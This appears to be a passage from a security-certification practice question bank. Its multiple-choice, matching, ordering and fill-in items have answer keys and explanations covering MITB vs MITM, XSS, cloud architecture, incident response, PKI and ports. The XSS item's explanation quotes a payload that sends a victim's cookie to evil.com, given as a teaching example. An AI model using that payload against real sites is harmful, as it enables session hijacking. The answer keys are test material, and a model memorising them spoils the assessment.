  {id:883,domain:T,question:"What is a man-in-the-browser versus man-in-the-middle attack — key distinguishing factor?",options:["There is no meaningful technical difference between these attacks","MITB operates via malware infecting the browser application itself (defeating even TLS since it manipulates data after decryption), while MITM operates by intercepting network traffic between two endpoints (which TLS encryption can effectively defend against)","MITM only works on mobile devices while MITB only works on desktops","MITB requires no malware while MITM always requires malware installation"],answer:1,explanation:"This distinction matters significantly for defense: properly implemented TLS effectively defeats network-level MITM attacks by encrypting data in transit, but MITB attacks operate inside the browser after decryption has already occurred, meaning TLS provides no protection — defenses against MITB require endpoint security (anti-malware) rather than network/transport-layer encryption.",optionExplanations:["These attacks operate at fundamentally different layers (endpoint/application vs. network) with different implications for which defenses are effective.","This layer distinction is critical for security architecture — TLS effectively mitigates network-based MITM but provides zero protection against MITB, which requires endpoint-focused defenses like anti-malware and application integrity verification instead.","Neither attack is restricted to a specific device category; both can occur on desktop or mobile platforms depending on the specific attack implementation.","MITB inherently requires malware infection of the browser; MITM typically doesn't require malware (it exploits network positioning), making this option's premise backwards."]},
  {id:884,domain:A,question:"What is the purpose of implementing immutable infrastructure in cloud environments?",options:["Infrastructure that can never be modified even by authorized administrators","An approach where servers/infrastructure components are never modified after deployment — instead, any change requires deploying a new, replacement instance from a known-good image, reducing configuration drift and providing consistent, auditable infrastructure state","Infrastructure that is physically immovable once installed in a data center","A backup approach used only for disaster recovery testing"],answer:1,explanation:"Instead of patching or modifying a running server (which can lead to configuration drift and inconsistency across an environment), immutable infrastructure practices deploy a new instance from an updated golden image and decommission the old one — this ensures consistency, makes rollback trivial (just redeploy the previous image), and limits the window an attacker has to establish persistence on a long-running, modified system.",optionExplanations:["Immutable infrastructure can still be replaced/redeployed through proper processes; the principle is about avoiding ad-hoc in-place modification, not making change impossible entirely.","Immutability eliminates configuration drift (where manual changes accumulate inconsistently over time) and limits attacker persistence opportunities, since compromised running instances are regularly replaced rather than indefinitely patched in place.","This is a logical/architectural deployment philosophy in cloud computing, unrelated to physical hardware mobility.","Immutable infrastructure is a standard ongoing deployment and operations practice, not limited to disaster recovery testing scenarios."]},
  {id:885,domain:O,question:"What is the purpose of a 'lessons learned' repository or knowledge base for incident response?",options:["A repository that only stores employee training certificates","A centralized, searchable collection of documented insights, root causes, and remediation actions from past incidents, allowing the organization to learn from history and avoid repeating the same mistakes across different teams and over time","A backup of all raw incident log data with no analysis","A repository accessible only to external auditors"],answer:1,explanation:"Without a centralized knowledge base, valuable insights from past incidents can be lost when team members leave or simply forgotten over time — a well-maintained lessons-learned repository allows new analysts to quickly reference how similar past incidents were handled, what root causes were identified, and what remediation worked, accelerating future response and avoiding repeated mistakes.",optionExplanations:["This is an institutional knowledge repository for incident insights, not an HR training record system.","Centralized lessons-learned knowledge prevents organizational knowledge loss and repeated mistakes, particularly valuable in environments with team turnover or where similar incident patterns recur over time.","The repository's value comes specifically from analyzed insights and root causes, not raw unanalyzed log data, which would require re-analysis each time to be useful.","Lessons-learned repositories are primarily internal knowledge tools for the security team's ongoing use, though relevant excerpts might be shared with auditors as supporting evidence."]},
  {id:886,domain:T,question:"What is a token replay/session token theft attack via XSS?",options:["A legitimate token refresh mechanism in OAuth","An attack where a cross-site scripting (XSS) vulnerability is exploited to steal a victim's session token or authentication cookie via malicious JavaScript, which the attacker then uses to impersonate the victim's authenticated session", "A method for safely rotating API keys","An attack that requires no JavaScript execution capability"],answer:1,explanation:"A stored XSS vulnerability might allow an attacker to inject document.location='http://evil.com/steal?cookie='+document.cookie, sending the victim's session cookie to the attacker's server the moment another user views the malicious content — with that stolen token, the attacker can directly access the victim's authenticated session without needing their password, which is why HttpOnly cookie flags (preventing JavaScript access to cookies) are a critical defense.",optionExplanations:["This describes a malicious theft technique, not a legitimate, authorized token refresh process.","This attack chain demonstrates why XSS vulnerabilities are considered high-severity — they can be leveraged beyond simple defacement to directly compromise user sessions and bypass authentication entirely, which is why HttpOnly and Secure cookie flags are essential defenses.","Key rotation is a legitimate credential management practice, the opposite of this malicious session hijacking technique.","This attack fundamentally requires JavaScript execution (via the XSS vulnerability) to access and exfiltrate the session token/cookie data."]},
  {id:887,domain:P,question:"What is the purpose of conducting third-party/vendor risk assessments before onboarding a new supplier?",options:["Assessing only the vendor's pricing competitiveness","Evaluating a prospective vendor's security posture, controls, and practices before granting them access to organizational systems or data, ensuring they meet minimum security standards and don't introduce unacceptable supply chain risk","A one-time check performed only after a vendor relationship ends","An assessment required only for vendors based in certain countries"],answer:1,explanation:"Vendor risk assessments (often using security questionnaires, requesting SOC 2 reports, or running technical scans) help organizations avoid onboarding vendors with weak security practices that could become a backdoor into their own environment — given that many major breaches (like the Target breach via an HVAC vendor) originated through compromised third-party vendor access, this due diligence step has become a standard, critical practice.",optionExplanations:["While cost matters for vendor selection generally, security risk assessment specifically focuses on the vendor's security practices and posture, not pricing.","Pre-onboarding assessment is critical because by granting vendor access, an organization inherits some of that vendor's security risk — proactive evaluation prevents onboarding vendors whose weak security could become an attack vector into the primary organization.","Assessment should occur before and ideally throughout the vendor relationship (not just at the end), since ongoing security posture can change and access typically continues throughout the engagement.","Vendor risk assessment should apply based on the level of access and data sensitivity involved, not be limited to specific countries, though geopolitical risk can be one assessment factor among several."]},
  {id:888,domain:A,question:"What is the purpose of implementing a Security Service Edge (SSE) architecture?",options:["A physical edge device installed only at network perimeter locations","A cloud-delivered security architecture combining capabilities like Secure Web Gateway (SWG), Cloud Access Security Broker (CASB), and Zero Trust Network Access (ZTNA) into a unified platform, securing access for distributed/remote users without backhauling traffic through a central data center","A backup security service used only during cloud outages","An architecture that eliminates the need for any endpoint security software"],answer:1,explanation:"SSE (a subset of the broader SASE framework) addresses the reality of distributed, cloud-first, remote workforces by delivering security enforcement from the cloud edge close to users, rather than forcing all traffic back through a traditional data center perimeter — this provides consistent security policy enforcement regardless of user location while improving performance compared to traditional VPN backhaul architectures.",optionExplanations:["SSE is a cloud-delivered architecture/service model, not a specific physical hardware appliance tied to one location.","SSE consolidates multiple previously-separate security functions into a unified, cloud-native platform specifically designed for the modern reality of distributed users and cloud-resident applications, avoiding the performance penalty of traditional centralized security architectures.","SSE is a primary, ongoing security architecture for distributed access, not a failover/backup mechanism.","SSE complements rather than replaces endpoint security; it focuses on network/access security, while endpoint protection (EDR/antivirus) remains a separate, necessary security layer."]},
  {id:889,domain:O,question:"What is the purpose of establishing clear roles and responsibilities (RACI matrix) within an incident response plan?",options:["A matrix used only for tracking project budgets","A framework defining who is Responsible, Accountable, Consulted, and Informed for each task during an incident, eliminating confusion about ownership and ensuring critical actions aren't missed due to assumption that 'someone else' would handle them","A matrix used to rank employees for promotion decisions","A document required only for incidents involving external regulators"],answer:1,explanation:"During the chaos of an active incident, ambiguity about who's responsible for specific actions (notifying legal, communicating with customers, making technical containment decisions) can cause critical delays or gaps — a RACI matrix established in advance, during calm conditions, ensures everyone understands their role before a real crisis tests the plan.",optionExplanations:["RACI in an IR context defines incident response roles/ownership, not financial budget tracking.","RACI matrices directly address one of the most common incident response failures — diffusion of responsibility where critical tasks go undone because each person assumed someone else would handle it — by making accountability explicit in advance.","This is a role/responsibility clarity tool for incident handling, unrelated to performance evaluation or career advancement decisions.","RACI matrices benefit incident response broadly across all incident types and severities, not solely those involving external regulatory bodies."]},
  {id:890,domain:T,question:"What is the relationship between a vulnerability scanner and a penetration test in identifying security weaknesses?",options:["They are identical tools that produce identical results","Vulnerability scanners use automated tools to identify known vulnerabilities based on signatures/databases at scale, while penetration testing involves skilled human testers actively attempting to exploit vulnerabilities (including business logic flaws scanners can't detect) to demonstrate real-world impact", "Penetration testing is always fully automated with no human involvement","Vulnerability scanners can identify business logic flaws better than human testers"],answer:1,explanation:"A vulnerability scanner might identify that a server is missing a specific patch (a known CVE) by checking version banners, while a penetration tester might chain together multiple lower-severity findings, exploit a business logic flaw (like manipulating a price parameter in an e-commerce checkout), or use social engineering — finding issues that automated scanning alone would never identify because they require human creativity and contextual understanding.",optionExplanations:["These are distinct but complementary approaches — scanners provide breadth and consistency at scale, while penetration testing provides depth and human creative exploitation that scanners cannot replicate.","This distinction is fundamental — scanners excel at broad, consistent coverage of known vulnerability signatures, while skilled human pentesters provide the creative, contextual thinking needed to chain vulnerabilities and identify business logic flaws unique to each application.","Penetration testing fundamentally relies on skilled human testers, even though they may use automated tools as part of their broader manual methodology and creative approach.","Business logic flaws (like exploiting a flawed discount code workflow) require human understanding of intended application behavior and creative thinking — something automated scanners are specifically poor at detecting since they lack contextual business understanding."]},
  {id:891,domain:G,question:"What is the purpose of implementing the principle of 'need to know' alongside least privilege?",options:["Need to know means everyone should know everything about company operations","Restricting access to sensitive information specifically to individuals who require it to perform their current job duties, even if they otherwise have sufficient privilege level/clearance to access it", "A principle that applies only to military and government organizations","A principle requiring all information to be publicly available by default"],answer:1,explanation:"A system administrator might have technical privilege (access rights) sufficient to view HR salary data, but 'need to know' restricts that access unless their specific job function requires it — this adds a contextual, justification-based layer beyond pure technical privilege level, commonly applied in classified information handling but equally relevant in corporate data governance.",optionExplanations:["This describes the opposite of 'need to know,' which specifically restricts rather than broadens information access.","'Need to know' adds an important nuance to least privilege — having the technical capability/clearance to access something doesn't mean access should be granted unless there's a genuine current job-related justification.","While the term originated in military/intelligence contexts, 'need to know' is a widely applicable data governance principle in corporate and any sensitive-data-handling environment.","This describes the opposite; 'need to know' specifically limits information access by default, not maximizes public availability."]},
  {id:892,domain:O,question:"What is the purpose of implementing automated isolation/quarantine actions for compromised endpoints?",options:["A manual process requiring executive approval before any action can be taken","An automated EDR/SOAR response capability that immediately isolates a detected compromised endpoint from the network (while preserving it for forensic analysis), containing the threat and preventing lateral movement without waiting for manual analyst action", "A process used only for decommissioning old hardware","A backup procedure unrelated to active threat response"],answer:1,explanation:"Modern EDR platforms (CrowdStrike, SentinelOne) can automatically isolate a host showing high-confidence malicious behavior (like active ransomware encryption) within seconds of detection, network-isolating it while keeping it powered on for forensic investigation — this dramatically reduces the window for lateral movement compared to waiting for human analyst review and manual action, which could take critical minutes during active, fast-spreading threats like ransomware.",optionExplanations:["Automated isolation specifically removes the bottleneck of waiting for manual/executive approval, critical for fast-moving threats like ransomware where seconds matter.","Speed is the critical value here — automated isolation can contain a fast-spreading threat (like ransomware) in seconds rather than the minutes or longer that manual analyst response and approval workflows would require.","This is an active incident response/containment action, unrelated to hardware end-of-life decommissioning processes.","This is a core, real-time active threat containment capability, directly central to modern automated incident response."]},
  {id:893,domain:T,question:"What is a malicious insider's potential use of 'living off the land' techniques?",options:["Using only custom-built, easily detectable malware tools","Leveraging legitimate, already-installed system administration tools (PowerShell, WMI, PsExec) to perform malicious actions, blending in with normal administrative activity and evading detection tools that focus on identifying known-malicious executables","A technique exclusive to external attackers, never used by insiders","A farming/agricultural technique unrelated to cybersecurity"],answer:1,explanation:"An insider with legitimate administrative access using PowerShell to exfiltrate data or modify permissions generates activity that looks identical to normal IT administrative work in logs — this makes living-off-the-land techniques particularly effective for insider threats specifically because the baseline of 'this person normally uses these tools' makes anomaly detection significantly harder than for external attackers introducing unfamiliar tools.",optionExplanations:["LOLBins techniques specifically avoid custom malware in favor of pre-existing, trusted system tools, precisely to evade detection focused on identifying unusual/malicious executables.","LOLBins evade detection specifically because they use tools already trusted and expected to be present and used on the system, making malicious use blend into the noise of legitimate administrative activity — a particular challenge for insiders who already have legitimate reasons to use these tools.","Both external attackers (post-compromise) and malicious insiders commonly use LOLBins techniques, since insiders especially benefit from the technique blending into their already-expected legitimate tool usage.","This is a cybersecurity technique describing abuse of legitimate system tools, unrelated to agricultural land use."]},
  {id:894,domain:A,question:"What is the purpose of implementing data loss prevention (DLP) endpoint agents?",options:["Agents that prevent any data from ever leaving a device, including legitimate business use","Software installed on endpoints that monitors and can block unauthorized transfer of sensitive data (via USB, email, cloud upload, printing) based on content inspection and policy rules, preventing both accidental and malicious data exfiltration","A backup agent that only restores lost data after deletion","An agent used exclusively for monitoring employee productivity metrics"],answer:1,explanation:"DLP agents inspect content being transferred (using pattern matching for SSNs, credit card numbers, or classified document tags) and can block, warn, or log policy violations — for example, blocking an attempt to email a spreadsheet containing customer SSNs to a personal email address, while still allowing normal, non-sensitive business communications to proceed unimpeded.",optionExplanations:["Properly configured DLP allows legitimate business data flows while specifically targeting policy violations involving sensitive data, not blanket prevention of all data movement.","DLP specifically addresses the risk of sensitive data leaving organizational control, whether through malicious insider action, compromised accounts, or simple employee mistakes — content-aware policies allow it to distinguish sensitive data transfers from routine business activity.","DLP is a proactive prevention/monitoring control for data exfiltration, distinct from backup/recovery tools that restore previously lost or deleted data.","While some DLP capability could theoretically be misused for monitoring, its designed security purpose is sensitive data protection, not general productivity tracking."]},
  {id:895,domain:O,question:"What is the purpose of validating backup integrity through regular restore testing?",options:["Simply confirming that backup files exist on storage media without testing them","Periodically performing actual test restorations of backup data to verify that backups are complete, uncorrupted, and genuinely usable for recovery, since an untested backup provides false confidence", "A test performed only once, when the backup system is first installed","A test that should only be conducted during an actual disaster"],answer:1,explanation:"Many organizations have discovered during an actual crisis that their backups were corrupted, incomplete, or simply hadn't been running successfully for months — only actual restore testing (not just verifying backup job 'success' status in logs) confirms that data can genuinely be recovered, which is why mature backup strategies include regular (e.g., quarterly) full restore tests as a validation practice.",optionExplanations:["Confirming file existence alone doesn't validate backup usability — corruption, incomplete backups, or format issues can render backups useless despite appearing to exist successfully.","This practice directly addresses a common and costly failure mode — organizations discovering during an actual emergency that backups they relied upon were silently broken, which regular restore testing would have caught proactively.","Backup systems, data, and infrastructure change over time, requiring ongoing periodic restore testing to maintain confidence in recovery capability, not just a single initial validation.","Testing should occur proactively and regularly, specifically so that any issues are caught and fixed before an actual disaster, when there would be no time or margin for backup failures."]},
  {id:896,domain:T,question:"What is the significance of an attacker achieving 'living off the land' persistence via scheduled tasks or cron jobs?",options:["Scheduled tasks have no relevance to malware persistence mechanisms","Attackers can create malicious scheduled tasks (Windows Task Scheduler) or cron jobs (Linux) that execute their payload at regular intervals or system startup, providing automatic persistence even if the initial malware process or connection is terminated", "A legitimate IT administration function never abused by attackers","A technique that requires physical access to create"],answer:1,explanation:"A scheduled task disguised with an innocuous name (e.g., mimicking a legitimate Windows update task) that re-executes malware every few hours ensures the attacker maintains access even if the initial infection vector is cleaned up or the malicious process is killed — security teams should regularly audit scheduled tasks/cron jobs for unauthorized or suspicious entries as part of persistence-hunting activities.",optionExplanations:["Scheduled tasks/cron jobs are one of the most common and effective persistence mechanisms used by malware and attackers specifically because they're a normal, expected part of system administration that can hide malicious activity in plain sight.","This persistence technique is effective specifically because scheduled execution is a routine, often overlooked area — attackers exploit this normalcy to maintain long-term access that survives reboots and process termination.","While legitimate administrators use scheduling for routine tasks, this same functionality is commonly abused by attackers for persistence, making it a dual-use mechanism requiring monitoring.","This technique can be created remotely via command execution (e.g., through an initial RCE vulnerability or stolen credentials), not requiring physical access to the system."]},
  {id:897,domain:P,question:"What is the purpose of conducting a maturity assessment against a model like the Capability Maturity Model Integration (CMMI) or a security-specific maturity model?",options:["Assessing only the age of deployed security hardware","Evaluating an organization's security processes against defined maturity levels (e.g., ad hoc, repeatable, defined, managed, optimized) to understand current process sophistication and create a roadmap toward more consistent, measurable, and continuously improving security operations", "A one-time certification with no ongoing relevance","An assessment that only applies to software development organizations"],answer:1,explanation:"A security program might be assessed as 'ad hoc' for vulnerability management (inconsistent, reactive patching with no formal process) but 'managed' for access control (well-documented, consistently followed, metrics-tracked provisioning/deprovisioning) — maturity models help organizations understand not just whether controls exist, but how consistently and effectively they're actually executed, providing a roadmap for systematic improvement.",optionExplanations:["Maturity models assess process sophistication and consistency, not physical hardware age/condition.","Maturity assessments provide nuanced insight beyond simple compliance checklists — they reveal not just whether a control exists but how consistently, measurably, and effectively it's executed, guiding meaningful process improvement investment.","Maturity is an evolving state requiring periodic reassessment as the organization and threat landscape change, not a one-time static certification.","While CMMI originated in software development contexts, maturity model concepts have been widely adapted for security programs broadly, applicable to any organization regardless of whether software development is a core function."]},
  {id:898,domain:A,question:"What is the purpose of implementing hardware-based multi-factor authentication (e.g., FIDO2/WebAuthn security keys)?",options:["Hardware keys that only work with a single specific website","Physical security keys (YubiKey, Titan Key) that provide phishing-resistant authentication by cryptographically verifying both the user's possession of the key and the legitimacy of the website domain, defeating most credential phishing and MFA-bypass techniques","A backup authentication method used only when passwords are forgotten","A method that eliminates the need for any username entirely"],answer:1,explanation:"Unlike SMS or app-based OTP codes (which can be phished via real-time relay attacks or SIM swapping), FIDO2/WebAuthn hardware keys perform origin-bound cryptographic challenge-response authentication — even if a user is tricked into visiting a perfect phishing replica of a legitimate site, the security key won't authenticate because the cryptographic check inherently validates the actual domain, making this one of the strongest available defenses against phishing-based account takeover.",optionExplanations:["FIDO2/WebAuthn keys are designed to work across multiple compliant websites/services using public key cryptography, not limited to a single site.","FIDO2 hardware keys provide superior phishing resistance compared to other MFA methods specifically because the authentication is cryptographically bound to the legitimate domain, making real-time phishing relay attacks ineffective — a significant security advantage over OTP-based methods.","Hardware security keys are a primary, ongoing authentication factor for regular login use, not solely a password-recovery fallback mechanism.","Username/identity is still required alongside the hardware key as part of the multi-factor authentication process; the key proves possession, not identity by itself."]},
  {id:899,domain:O,question:"What is the purpose of conducting a 'purple team' continuous improvement cycle combining detection engineering with adversary emulation?",options:["A cycle that focuses solely on writing incident reports after the fact","An iterative process where red team/adversary emulation techniques (mapped to frameworks like MITRE ATT&CK) are used to test specific detection capabilities, with blue team immediately tuning and validating detections, continuously improving the SOC's ability to catch real-world adversary techniques", "A process used only once per year during annual security audits","A cycle that excludes any reference to real-world threat intelligence"],answer:1,explanation:"A mature purple team cycle might emulate a specific MITRE ATT&CK technique (e.g., T1003 - OS Credential Dumping), observe whether the SOC's detection stack catches it, and if not, immediately work with detection engineers to build and validate a new detection rule — then test again, creating a continuous feedback loop directly tied to real adversary tactics rather than abstract, generic detection rule development.",optionExplanations:["The cycle is centered on proactive testing and immediate detection improvement, not retrospective documentation after the fact.","This continuous, technique-by-technique improvement cycle, often mapped against MITRE ATT&CK, ensures detection engineering efforts are directly validated against realistic adversary behavior rather than developed in a vacuum, producing measurably more effective detections over time.","The value of this approach comes specifically from its continuous, iterative nature — frequent cycles (not just annual) allow for rapid, ongoing detection capability improvement as the threat landscape evolves.","Purple team exercises are specifically grounded in real-world threat intelligence and frameworks like MITRE ATT&CK to ensure tested techniques reflect actual observed adversary behavior, not theoretical or arbitrary scenarios."]},
  {id:900,domain:G,question:"What is the overarching goal of a comprehensive information security program, synthesizing confidentiality, integrity, availability, and risk management?",options:["Achieving a state of zero risk and zero possible security incidents","Reducing organizational risk to an acceptable level by implementing a balanced set of administrative, technical, and physical controls that protect the confidentiality, integrity, and availability of information assets while enabling the organization to achieve its business objectives", "Implementing the maximum possible number of security controls regardless of cost or business impact","Achieving compliance certifications as the sole and final objective"],answer:1,explanation:"Effective security programs recognize that absolute security is neither achievable nor desirable (it would paralyze business operations) — the goal is risk management: identifying assets and threats, implementing proportionate and balanced controls (administrative policies, technical safeguards, physical security), and continuously adapting as the threat landscape and business needs evolve, ultimately enabling rather than hindering the organization's mission.",optionExplanations:["Zero risk is an unrealistic and counterproductive goal — perfect security would require eliminating all functionality and connectivity; real security programs manage risk to acceptable levels instead.","This captures the holistic, business-aligned purpose of security — protecting the CIA triad through balanced, proportionate controls while still enabling the organization to function and pursue its objectives, rather than security existing as an isolated, obstructive goal.","Maximizing control implementation without regard to cost-effectiveness or business impact leads to security theater and business paralysis, not actual risk reduction.","Compliance certifications are typically a byproduct or validation of a good security program, not the program's ultimate purpose — compliance doesn't guarantee actual security, and treating it as the end goal can lead to checkbox-only security."]},

  // ── Performance-Based Questions (PBQ) ─────────────────────────────
  {id:901,type:"matching",domain:G,question:"Match each cryptographic algorithm to its correct type.",pairs:[
    {term:"AES-256",match:"Symmetric Encryption"},
    {term:"RSA-2048",match:"Asymmetric Encryption"},
    {term:"SHA-256",match:"Hashing Algorithm"},
    {term:"HMAC-SHA256",match:"Message Authentication Code"},
  ],explanation:"AES is a symmetric block cipher using a shared key. RSA is asymmetric, using a public/private key pair. SHA-256 produces a fixed-length hash used for integrity checking. HMAC combines a hash function with a secret key to authenticate messages."},

  {id:902,type:"matching",domain:G,question:"Match each network port to the service that uses it by default.",pairs:[
    {term:"Port 22",match:"SSH"},
    {term:"Port 443",match:"HTTPS"},
    {term:"Port 389",match:"LDAP"},
    {term:"Port 514",match:"Syslog"},
  ],explanation:"Port 22 is SSH for secure remote shell access. Port 443 is HTTPS for encrypted web traffic. Port 389 is LDAP for directory services. Port 514 is the standard Syslog port for centralized log forwarding."},

  {id:903,type:"matching",domain:T,question:"Match each attack type to its primary description.",pairs:[
    {term:"Phishing",match:"Fraudulent email designed to steal credentials"},
    {term:"SQL Injection",match:"Inserts malicious code into a database query"},
    {term:"DDoS",match:"Floods a system to make it unavailable"},
    {term:"Man-in-the-Middle",match:"Secretly intercepts communications between two parties"},
  ],explanation:"Phishing uses deceptive emails to trick users. SQL injection exploits unsanitized input to manipulate databases. DDoS overwhelms resources to deny legitimate access. Man-in-the-Middle (on-path) attacks intercept and potentially alter traffic in transit."},

  {id:904,type:"matching",domain:G,question:"Match each security control example to its correct control type.",pairs:[
    {term:"Security Awareness Training",match:"Administrative"},
    {term:"Intrusion Detection System",match:"Technical"},
    {term:"Mantrap Entry",match:"Physical"},
    {term:"Risk Assessment Policy",match:"Managerial"},
  ],explanation:"Administrative controls include training and procedures governing people. Technical controls use hardware/software like IDS. Physical controls restrict physical access (mantraps, locks). Managerial controls govern risk through policies and governance frameworks."},

  {id:905,type:"matching",domain:G,question:"Match each authentication example to its authentication factor type.",pairs:[
    {term:"Password",match:"Something you know"},
    {term:"Hardware Token",match:"Something you have"},
    {term:"Iris Scan",match:"Something you are"},
    {term:"GPS Location",match:"Somewhere you are"},
  ],explanation:"Passwords and PINs are knowledge factors. Hardware tokens (smart cards, TOTP devices) are possession factors. Biometrics (iris, fingerprint) are inherence factors. Location-based authentication represents a fourth factor (somewhere you are)."},

  {id:906,type:"matching",domain:A,question:"Match each cloud service model to its primary description.",pairs:[
    {term:"IaaS",match:"Provides virtualized servers, storage, and networking"},
    {term:"PaaS",match:"Provides a development platform and runtime environment"},
    {term:"SaaS",match:"Delivers fully managed applications over the internet"},
    {term:"SECaaS",match:"Delivers security services as a cloud subscription"},
  ],explanation:"Infrastructure as a Service (IaaS) gives raw compute/storage. Platform as a Service (PaaS) adds a managed development environment. Software as a Service (SaaS) delivers complete applications. Security as a Service (SECaaS) provides cloud-delivered security functions such as SIEM or DLP."},

  {id:907,type:"matching",domain:G,question:"Match each PKI component to its function.",pairs:[
    {term:"Certificate Authority (CA)",match:"Issues and digitally signs certificates"},
    {term:"Registration Authority (RA)",match:"Validates requester identity before certificate issuance"},
    {term:"Certificate Revocation List (CRL)",match:"Lists certificates that are no longer trusted"},
    {term:"OCSP",match:"Provides real-time certificate validity status"},
  ],explanation:"The CA is the trusted root that signs certificates. The RA performs identity verification on behalf of the CA. The CRL is a published list of revoked certificate serial numbers. OCSP (Online Certificate Status Protocol) allows real-time validity checks, replacing periodic CRL downloads."},

  {id:908,type:"matching",domain:A,question:"Match each wireless security standard to its key characteristic.",pairs:[
    {term:"WEP",match:"Uses RC4 stream cipher; deprecated due to weak IVs"},
    {term:"WPA2",match:"Uses AES-CCMP; most widely deployed standard"},
    {term:"WPA3",match:"Uses SAE; resistant to offline dictionary attacks"},
    {term:"802.1X",match:"Port-based network access control for enterprise authentication"},
  ],explanation:"WEP is broken due to short IVs combined with RC4. WPA2 uses AES in Counter Mode (CCMP). WPA3 replaces PSK with Simultaneous Authentication of Equals (SAE), eliminating offline password attacks. 802.1X is an IEEE standard for port-based NAC using EAP and a RADIUS server."},

  {id:909,type:"matching",domain:T,question:"Match each malware type to its defining behavior.",pairs:[
    {term:"Ransomware",match:"Encrypts victim files and demands payment for decryption"},
    {term:"Rootkit",match:"Conceals malicious activity by hooking OS kernel functions"},
    {term:"Keylogger",match:"Records and exfiltrates keystrokes silently"},
    {term:"Worm",match:"Self-replicates across networks without user interaction"},
  ],explanation:"Ransomware encrypts files to extort victims. Rootkits hide malware by modifying OS internals. Keyloggers capture credentials and sensitive input. Worms spread autonomously by exploiting network vulnerabilities without requiring a host file or user action."},

  {id:910,type:"matching",domain:P,question:"Match each compliance framework to its primary regulatory focus.",pairs:[
    {term:"HIPAA",match:"U.S. healthcare patient data privacy and security"},
    {term:"PCI DSS",match:"Payment card industry data security requirements"},
    {term:"GDPR",match:"European Union personal data protection"},
    {term:"SOX",match:"U.S. corporate financial reporting integrity"},
  ],explanation:"HIPAA protects healthcare patient information in the U.S. PCI DSS sets security requirements for card payment systems. GDPR mandates data protection rights for EU residents. SOX (Sarbanes-Oxley) requires accurate financial reporting and internal controls for U.S. public companies."},

  {id:911,type:"ordering",domain:O,question:"Arrange the NIST SP 800-61 incident response phases in the correct order, from first to last.",items:[
    "Preparation",
    "Detection & Analysis",
    "Containment, Eradication & Recovery",
    "Post-Incident Activity",
  ],explanation:"NIST SP 800-61 defines four phases: (1) Preparation — establish capabilities before an incident; (2) Detection & Analysis — identify and understand the incident; (3) Containment, Eradication & Recovery — limit damage and restore systems; (4) Post-Incident Activity — document lessons learned and improve defenses."},

  {id:912,type:"ordering",domain:O,question:"Arrange the digital forensics process steps in the correct order, from first to last.",items:[
    "Identify",
    "Preserve",
    "Collect",
    "Examine",
    "Analyze",
    "Present",
  ],explanation:"Digital forensics follows: (1) Identify — find potential evidence sources; (2) Preserve — protect integrity using write blockers and hashing; (3) Collect — acquire evidence per legal guidelines; (4) Examine — process raw data; (5) Analyze — find patterns, timelines, and artifacts; (6) Present — deliver court-ready findings."},

  {id:913,type:"ordering",domain:P,question:"Arrange the risk management lifecycle steps in the correct order, from first to last.",items:[
    "Identify Risks",
    "Assess Risks",
    "Plan Risk Response",
    "Implement Controls",
    "Monitor & Review",
  ],explanation:"Risk management follows: (1) Identify — catalog threats and vulnerabilities; (2) Assess — evaluate likelihood and impact; (3) Plan — choose to accept, avoid, transfer, or mitigate each risk; (4) Implement — put controls in place; (5) Monitor — continuously review control effectiveness and adapt."},

  {id:914,type:"ordering",domain:O,question:"Arrange the vulnerability management lifecycle steps in the correct order, from first to last.",items:[
    "Discover Assets",
    "Scan for Vulnerabilities",
    "Prioritize Findings",
    "Remediate Vulnerabilities",
    "Verify Remediation",
  ],explanation:"Vulnerability management follows: (1) Discover — enumerate all assets in scope; (2) Scan — use tools like Nessus or Qualys; (3) Prioritize — rank by CVSS score and business context; (4) Remediate — patch, reconfigure, or apply compensating controls; (5) Verify — confirm vulnerabilities are closed and no regressions introduced."},

  {id:915,type:"ordering",domain:G,question:"Arrange the PKI certificate enrollment steps in the correct order, from first to last.",items:[
    "Generate Key Pair",
    "Submit Certificate Signing Request (CSR)",
    "CA Validates Requester Identity",
    "CA Issues Signed Certificate",
    "Install Certificate on System",
  ],explanation:"PKI enrollment: (1) Generate a public/private key pair on the requester's system; (2) Create a CSR containing the public key and identity info; (3) The CA verifies the requester's identity via the RA or other means; (4) The CA signs the certificate and returns it; (5) The certificate is installed and bound to the private key on the target system."},

  {id:916,type:"fillin",domain:G,question:"What is the default TCP port number used by SSH (Secure Shell)?",answer:"22",aliases:["port 22","tcp 22","tcp/22"],explanation:"SSH uses TCP port 22 by default for encrypted remote command-line access. It replaced Telnet (port 23) which transmitted credentials in plaintext. Port 22 is a common reconnaissance target and is often changed or restricted to reduce exposure."},

  {id:917,type:"fillin",domain:G,question:"In the CIA security triad, what does the letter 'A' stand for?",answer:"availability",aliases:["Availability"],explanation:"The CIA triad stands for Confidentiality (protecting data from unauthorized disclosure), Integrity (ensuring data accuracy and trustworthiness), and Availability (ensuring systems and data are accessible to authorized users when needed). All three properties must be balanced in a security program."},

  {id:918,type:"fillin",domain:T,question:"What type of malware disguises itself as legitimate or useful software to trick users into installing it?",answer:"trojan",aliases:["trojan horse","trojan malware","a trojan"],explanation:"A Trojan horse (Trojan) appears to be benign software but contains a malicious payload. Unlike viruses and worms, Trojans do not self-replicate — they rely on user action to execute. Common examples include fake utilities, games, or software cracks bundled with backdoors or spyware."},

  {id:919,type:"fillin",domain:G,question:"What is the default port number used by DNS (Domain Name System) for standard queries?",answer:"53",aliases:["port 53","udp 53","tcp 53","udp/53","tcp/53"],explanation:"DNS uses port 53 for both UDP (standard queries) and TCP (zone transfers and responses exceeding 512 bytes). DNS over HTTPS (DoH) uses port 443 and DNS over TLS (DoT) uses port 853 for encrypted resolution."},

  {id:920,type:"fillin",domain:G,question:"What is the term for the process of converting ciphertext back into its original plaintext using a key?",answer:"decryption",aliases:["decrypt","deciphering"],explanation:"Decryption reverses the encryption process, transforming ciphertext back to readable plaintext using the appropriate key. In symmetric encryption, the same key encrypts and decrypts. In asymmetric encryption, the private key decrypts what the public key encrypted (or vice versa for digital signatures)."},
];
